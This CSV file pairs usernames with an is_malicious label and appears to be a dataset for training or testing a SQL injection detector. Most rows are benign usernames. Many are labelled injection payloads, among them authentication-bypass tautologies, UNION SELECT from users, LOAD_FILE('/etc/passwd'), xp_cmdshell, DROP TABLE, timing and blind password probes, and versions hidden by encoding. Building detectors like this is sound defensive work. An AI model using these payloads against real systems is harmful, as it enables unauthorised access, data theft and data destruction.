name,is_malicious
castrojay,0
dominique91,0
pbonilla%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
yjackson,0
underwoodholly,0
garygriffin,0
jamiegolden,0
'||'1'='1,1
'; EXEC xp_cmdshell('dir')--,1
johnsonsandra,0
' OR 0x50=0x50--,1
mthomas,0
kevinsanders,0
tinabaker,0
fblackwell,0
victoria66,0
bbates,0
nicoleibarra,0
debbie64,0
karenandrews,0
steven45,0
ihernandez,0
allenamanda,0
lacey14,0
jasongonzales,0
hunterjessica,0
khernandez,0
pmoore,0
cantumichael,0
xacosta,0
john01,0
salazarbrandon'/**/OR/**/'1'='1,1
millerjason,0
rguerra,0
angelagamble,0
jamesanderson,0
qblake,0
'/**/OR/**/'1'='1,1
"pricejerry'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
yray,0
serranojenna,0
fletcherchristina' OR 0x50=0x50--,1
gwatson,0
lance39,0
markcraig,0
robertsonamber,0
'%27%20OR%201=1--,1
ricetiffany,0
henrysarah,0
kellygonzalez,0
miranda48,0
jennifer50,0
flemingjoan,0
dbrown,0
mbanks,0
patrickwallace,0
jmartinez,0
miguelhernandez,0
'%20OR%201=1--,1
amyanderson,0
crystal03,0
qmoran,0
jbarnes,0
qreid,0
kellygonzalez,0
stacy50,0
ian31,0
wmoon,0
steeletiffany,0
jessica58' OR CHAR(49)=CHAR(49)--,1
hensleyjon0x270x2b0x280x530x450x4c0x450x430x540x200x270x300x270x200x460x520x4f0x4d0x200x750x730x650x720x730x200x570x480x450x520x450x200x750x730x650x720x6e0x610x6d0x650x3d0x270x610x640x6d0x690x6e0x270x200x410x4e0x440x200x530x550x420x530x540x520x490x4e0x470x280x700x610x730x730x770x6f0x720x640x2c0x310x2c0x310x290x3d0x270x610x270x290x2b0x27,1
joseph06,0
kimberlytucker' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
aaron96,0
ujackson,0
osanders,0
ajohnson,0
bgraves,0
staceyhernandez,0
stephenglover,0
fdixon,0
victoria26CHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
gregory96,0
brownlinda,0
alexandria99,0
chapmanstephen,0
jasoncarter,0
joshuahill,0
goodwinvictor,0
natalie77,0
xbell,0
daniel76,0
ericbailey,0
sgutierrez,0
stephaniephillips,0
' UNION SELECT * FROM users--,1
ufriedman,0
zwatson,0
christopherhernandez,0
chelsea53,0
' OR '1'='1,1
"schroederanthony' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
brandonhensley,0
timothy62,0
garymiranda,0
leonjodi' OR 0x50=0x50--,1
gfarmer,0
kandrade,0
hmorrow,0
cisneroskatherine,0
mmurphy,0
brianjacobs%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
jacquelinegolden,0
stephen48,0
dianarodgers,0
vmendoza,0
angelacollins,0
qsanders,0
susansmith,0
dfleming,0
tracyrogers'||'1'='1,1
pollardrobert,0
schaeferpaige,0
iwilkins'; EXEC xp_cmdshell('dir')--,1
qsilva,0
fowlerjoseph,0
shawn75,0
lmorales,0
kendra29,0
jacksonmegan,0
kevinhoward0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
diana13,0
ymalone,0
davismathew,0
james53,0
rweaver,0
kathryn08,0
tylerclark,0
ybrown,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
gregorylopez,0
michellethomas,0
rhernandez,0
jacqueline90,0
gperez,0
ppatterson,0
nicholas55CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
rachel03,0
donna33,0
hannahbrown,0
sharon88,0
%27%7c%7c%27%31%27%3d%27%31,1
ymiller,0
vtaylor,0
sarahhudson,0
danielderek,0
shannonjones,0
'%27%20OR%201=1--,1
jonathanjohnson,0
teresa81,0
kirbyerin,0
' OR BINARY 'a'='a'--,1
xgordon,0
barrontimothy,0
leonardamy,0
townsendjoan,0
contrerasnathan,0
sheiladonaldson,0
xthomas,0
kelly16,0
vhays,0
stevenholmes,0
mitchellsteve,0
colejeremy,0
matthew51,0
megan79,0
millsjoseph,0
scottberg'; EXEC xp_cmdshell('dir')--,1
nicole14,0
melissasmith,0
' OR '1'='1,1
ellislaura,0
kathryn46,0
kbuchanan,0
rosaleskiara,0
michael90,0
robinsoncarlos,0
benjamindavenport,0
0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
tarawilkins,0
sheilamatthews,0
wstewart,0
tiffany31,0
regina99,0
jason79,0
james47,0
hho,0
salazarsherry,0
hortonjulian,0
yrodgers,0
samuel52,0
emoore,0
jennifer51,0
theath,0
christopher70,0
kathleenharris,0
oliviapatterson,0
tiffany52,0
marytucker,0
hernandezerica,0
garzajoyce,0
traceythomas,0
courtney22,0
hayesheather,0
manuel66,0
moorecourtney,0
deborah52,0
joshuagarcia,0
thompsonkristin,0
bgriffin,0
jesus60,0
thompsonchristina,0
christopherhernandez,0
jessicahoward,0
riddlejennifer,0
millsaaron,0
brianna61,0
tmitchell,0
ginacollins,0
' OR BINARY 'a'='a'--,1
fishergregory,0
mitchelljeremy,0
sarahscott,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
andreaevans,0
brittany18,0
' OR '1'='1,1
cindygrant,0
phillipsjasonCHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
vharris,0
mcarter,0
sjackson,0
lisa42,0
ylane,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
pamela46CHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
johnsonjonathan,0
jennifergarcia,0
dixonheather,0
katie42,0
alejandra65,0
davidhester,0
' OR 1=1--,1
wadedavid,0
pollarddaniel,0
gshelton,0
avilarobin,0
stephaniejohnston,0
bhicks,0
sarah91,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
stevensthomas,0
brianpatterson,0
0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
tbenton,0
mariebarnes,0
mcclurekevin,0
lori85,0
robertsdevon,0
johnskristin,0
brivera'; DROP TABLE users--,1
drewcampbell,0
teresa44,0
alexjohnston,0
' OR BINARY 'a'='a'--,1
cassandraruiz,0
caseymatthew,0
lucasrosario' UNION SELECT * FROM users--,1
lindsaydean,0
richarddean,0
sarah25'; EXEC xp_cmdshell('dir')--,1
lvelasquez,0
williamsdana,0
ddean%27 %4f%52 %27%31%27%3d%27%31,1
smithtimothy,0
brittany68,0
sarahlane,0
luke95,0
harpermckenzie,0
stevenjones,0
kwilson,0
nadams' OR 1=1--,1
qcrawford,0
0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
catherine53,0
mpatel,0
danielwillis,0
troy900x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
michael23,0
' OR CHAR(49)=CHAR(49)--,1
weisscrystal,0
williamsrobert,0
gibbssally,0
fmason,0
joseph87,0
elijah03,0
mccartyalicia,0
uwatson,0
stevenowens,0
alejandra57,0
briannafoster,0
andersonjohn,0
alisha27,0
nsmith,0
michael65,0
kimberly96,0
christina92,0
donnaflores,0
johnbell,0
"amy97'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
"deborah68'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
destinyward,0
ymartinez,0
hoffmangarrett,0
ihicks,0
catherinewhitney,0
richmondrichard,0
brownjoseph,0
susan86,0
kylediaz,0
thompsonanthony,0
"williammalone' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
andrewduran,0
lisalogan,0
xtran,0
richardsonstephanie' OR '1'='1,1
jordanroach,0
ubuckley,0
jeffrey38,0
CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
ericparsons,0
john14'/**/OR/**/'1'='1,1
tamara78' OR CHAR(49)=CHAR(49)--,1
aliciabrooks' OR '1'='1,1
vscott%27 %4f%52 %27%31%27%3d%27%31,1
paulcaldwell,0
belljermaine,0
mortondavid,0
fosteralexander,0
ericaprice,0
hlee,0
yhernandez,0
kylemcguire,0
wmacdonald,0
brian67,0
butlerbradley,0
iromero,0
vwallace,0
judy95,0
emily35,0
elizabethmurphy,0
francisholly,0
xhubbard,0
chaneycarrie,0
igreer,0
luke99,0
allencynthia,0
brittanyanderson,0
watersnicholas'%27%20OR%201=1--,1
awilliams,0
jamesgibson,0
marytaylor,0
gilbertrebecca,0
theresa87,0
tkidd,0
jason51,0
' OR 1=1--,1
johnsonjoshua,0
kevin40,0
wcampbell,0
christopherlogan,0
rojasjoseph,0
ujacobs,0
powersjessica,0
joshuaramirez,0
ysimmons,0
hernandezjennifer,0
joshuacortez,0
zjones,0
thomas32,0
bobby78,0
ydiaz,0
perezjennifer,0
duffyjoy,0
reevescharles,0
' OR 1=1--,1
%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
christinaflores,0
hayesmichelle,0
CHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
ilewis,0
lewissherry,0
wolfeamber,0
megan30,0
icollins,0
thompsonjustin,0
lmarshall0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
sullivanjacqueline,0
mark07,0
dflynn' OR SOUNDEX('test')=SOUNDEX('test')--,1
'; EXEC xp_cmdshell('dir')--,1
awhite,0
' OR 0x50=0x50--,1
shelia70,0
weaveradam,0
'/**/OR/**/'1'='1,1
shelley32%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
williamsonshelley,0
jeffreycruz,0
hmyers,0
littleholly,0
matthewgray,0
daniel14,0
alexander95,0
amyfernandez%27%7c%7c%27%31%27%3d%27%31,1
regina01,0
davidgonzales,0
paulsimpson,0
kyle46,0
wanda32,0
dsalas,0
robleskelsey,0
pharris,0
melanie50,0
sheila35' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
seanpeters,0
frystephanie' OR 1=1--,1
pramirez,0
ymorgan,0
carterjonathan,0
kmoody,0
amymaddox,0
'%20OR%201=1--,1
sparksbruce,0
'%27%20OR%201=1--,1
twhite,0
dayers,0
andrew72,0
jose18,0
smithmarcus,0
garciahailey,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
washingtonjimmy,0
courtneyburns,0
daltondiana,0
jessicarush,0
wrichardson,0
%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
laura83,0
jerryvargas,0
oellis,0
johnwilson,0
russelljacob,0
jeffrey37,0
hodgeadam,0
hray,0
wardanthony,0
christophernelson,0
jeanprice,0
michaelmontes,0
jmendoza,0
patrick10CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
sknox,0
mclark,0
karen31,0
jennifersmith' OR 1=1--,1
philip41,0
patelrobert,0
sarahgutierrez,0
kari98,0
gabriel27,0
fnorman,0
denise64,0
michael120x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
jcampbell,0
glennrebecca,0
lisathomas,0
lisagonzalez,0
leroybradley,0
amandafields,0
kristin16,0
michael54,0
cooperrebecca,0
timothylee,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
coryrivera,0
brianhowell,0
harrisbenjamin,0
garciaantonio,0
wpham,0
frank34,0
whitedonna,0
bjackson,0
lorimorgan,0
kaylee55,0
david40,0
daniel64,0
goodjoseph'%20OR%201=1--,1
yhines,0
wendy05,0
montoyadanielle,0
jody00,0
suzannewilliams,0
edavidson,0
qrobinson,0
ryan81' OR CHAR(49)=CHAR(49)--,1
jaymoore,0
jennifergordon,0
shaun48,0
jpittman,0
sstafford,0
woodjennifer,0
ucortez,0
cheryl35,0
megan66'%27%20OR%201=1--,1
daniel33,0
phillip71,0
whiterichard,0
johnroy,0
bowen,0
barnettmichael,0
williamstephenson,0
qcuevas,0
mark07,0
debra74,0
royjohnson,0
julie66CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
liukevin,0
jensenashley,0
wproctor,0
mhill,0
phillipsmegan,0
gaybrian,0
zmorris,0
matthewpittman,0
rachel60,0
CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
jamie11'/**/OR/**/'1'='1,1
anitamartinez,0
rruiz,0
' UNION SELECT * FROM users--,1
williamsandoval,0
christina89,0
riggsalan,0
johnsonvictoria,0
walter43,0
salazarjacob,0
ethansmith,0
'%20OR%201=1--,1
christopher24' OR '1'='1,1
%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
vthompson,0
alexandravargas,0
%27 %4f%52 %31%3d%31--,1
pcraig,0
andrew87,0
howardmichelle,0
denise42,0
teresahogan,0
nicholehicks,0
ruizmary,0
zachary34,0
kayla23,0
danielmathews,0
raymichael,0
ggregory,0
jjohnson,0
brenda03,0
tgarcia,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
carterrobert,0
todd61,0
kjoyce,0
amichael' OR 1=1--,1
qmiller,0
kevinbrown,0
vanessa73,0
morganharper,0
lisajackson,0
craighernandez,0
cranejamie,0
hessbrian,0
scottmichael,0
smithsean,0
milessherry,0
danielkathleen,0
cody03,0
eblair,0
zgarcia,0
jason71,0
irogers0x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
oliviasavage,0
brandon26,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
brenda41,0
tiffanylopez,0
"dsherman' OR BENCHMARK(10000000,MD5(NOW()))--",1
michaelboyle,0
erin15,0
bellstephanie,0
ehartman,0
leeharper,0
luke87,0
martinezshane,0
rtodd,0
hannahsmith,0
xhall,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
melissa01,0
cody25,0
pinedajoshua' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
tiffanymartin,0
eric08,0
christina78,0
jacquelinelee,0
ryan45,0
joshuahill,0
franciscowillis,0
mdavis,0
CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
ericcampbell,0
melanie82,0
daniel12,0
huntsean,0
zgonzalez,0
smithkimberly,0
wblair,0
millercaitlin,0
james19,0
qherrera,0
ggray,0
deanemily,0
imartinez,0
emma35,0
kellylauren,0
mitchellvictor,0
noahadkins,0
jonessean,0
jessicabrown%27%7c%7c%27%31%27%3d%27%31,1
emily19' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
henrywilliam,0
lindseyday,0
andrew25,0
joshua52,0
jonesricky,0
jacquelinewilson,0
randydelacruz,0
iscott,0
ruben29,0
moyerbarbara,0
deborah42,0
coopervalerie,0
mary95,0
longjudith,0
sweeneyanthony,0
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
ggarrett,0
uking,0
lambjoseph,0
derek680x270x200x4f0x520x200x280x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x280x530x450x4c0x450x430x540x280x530x4c0x450x450x500x280x350x290x290x290x620x410x4b0x4c0x290x2d0x2d,1
yuheather,0
sbernard,0
kimberlyrivera,0
paul68,0
richard48,0
"jjackson'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
timothywest,0
0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
' OR '1'='1,1
fvargas,0
suzanne00,0
tracywilson,0
thomasgutierrez,0
michelle02,0
stewartjoe,0
omardavis,0
fowlerkrystal,0
alisonjenkins,0
hray,0
breanna24,0
andrewwoods' OR 0x50=0x50--,1
stacy39,0
odiaz,0
ywalker,0
coxjohn,0
amy30,0
michael85,0
brooke22,0
ggarner,0
montesaaron,0
englishronald,0
wangmegan,0
gchambers,0
johnavery,0
abanks,0
joe99,0
jgonzalez' UNION SELECT * FROM users--,1
mooredaniel,0
suzannehughes,0
hollydiaz,0
brooksblake,0
daniel95,0
walkerlori' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
caroldavis,0
burchjorge,0
williambradford,0
alanthompson,0
dawn09,0
kiara08'; DROP TABLE users--,1
'; EXEC xp_cmdshell('dir')--,1
valerie37,0
margaret39,0
lucastran,0
' OR '1'='1,1
garrisonstanley,0
erin93,0
berryjohn,0
leecrystal,0
wheelerronald,0
tknight,0
lbrown,0
hudsonamy,0
jimmy72' OR '1'='1,1
brian97,0
leonarddebbie,0
ycoleman,0
dawn33,0
michellechristensen,0
'%20OR%201=1--,1
nbarnett,0
xchaney,0
knightalexis,0
xtaylor,0
ftaylor,0
schroedergary,0
' OR 1=1--,1
johnstonjoseph'%27%20OR%201=1--,1
james41,0
arielmoses,0
umartin0x270x200x4f0x520x200x280x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x280x530x450x4c0x450x430x540x280x530x4c0x450x450x500x280x350x290x290x290x620x410x4b0x4c0x290x2d0x2d,1
coxjohn,0
melissaarmstrong,0
qgomez,0
johnmckenzie,0
diane22,0
coopercorey,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
jeffery08,0
wrightjessica,0
cathyharrison,0
ylambert,0
justin64,0
iperez,0
cruzmichael,0
watkinssierra,0
' OR 0x50=0x50--,1
patriciaramirez,0
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
benjaminlopez,0
ysmith,0
robert00,0
stacyowens,0
floydjohnathan,0
brookscarrie,0
trevor85,0
brandithomas,0
chelsealyons,0
shari11,0
ugreen,0
kanedawn,0
%27%7c%7c%27%31%27%3d%27%31,1
barnettterry,0
nguyentheresa,0
jamesjacob,0
kleach,0
brian98,0
nguyenmitchell,0
karalee,0
garciageorge,0
dennishill,0
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
michelle31,0
wendymiller,0
herreramelanie,0
sonia81,0
lisachandler,0
clarkleslie,0
erin77,0
julie42,0
jorge46,0
fisherlaura,0
villarrealrachael,0
'||'1'='1,1
barbaracook,0
seanking,0
mitchellgarcia,0
millerjennifer,0
anne46,0
garciaseth,0
andreacortez,0
kaylamartin,0
johnjohnson,0
denisechan,0
ggordon,0
kevinhobbs,0
perkinsmegan,0
daleboyd,0
"qhall'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
' OR BINARY 'a'='a'--,1
stuartgonzalez,0
williamsshannon,0
zsmith,0
bradleylisa,0
sheila78,0
npowell,0
vleon,0
qmayer,0
danielyoung,0
"ariana59' OR BENCHMARK(10000000,MD5(NOW()))--",1
emily70'; EXEC xp_cmdshell('dir')--,1
hvalenzuela,0
rossmichael,0
johnjohnson,0
jacob21,0
moorejames,0
nancynichols,0
mariajones,0
cheryl77,0
tiffanyvasquez,0
xhullCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
pjenkins%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
tonya43,0
harrisashley,0
denise91,0
tmccarty,0
jjennings,0
kristischmidt,0
davidsongregory,0
michaelgoodwin,0
jmeza%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
angelaashley,0
gainesmichael,0
0x270x200x4f0x520x200x420x490x4e0x410x520x590x200x270x610x270x3d0x270x610x270x2d0x2d,1
steven45,0
kristenwalter,0
aprilcolon,0
carrierodriguez,0
smithvincent,0
joyceellison,0
brownbrian,0
hollysmith,0
hughesjacqueline,0
erinsmith,0
moorejames,0
' OR '1'='1,1
david87%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
bakerashley,0
dana33,0
samuel06,0
jennifer38,0
mark91,0
bryantchristina,0
griffithanna,0
jeanbaldwin,0
aperez,0
christinemccoy,0
adamowens,0
tanya63,0
andersonjohn,0
jeffreymarquez,0
rbradley,0
davidwilliams,0
smithteresa,0
ricebrooke,0
craiggriffin,0
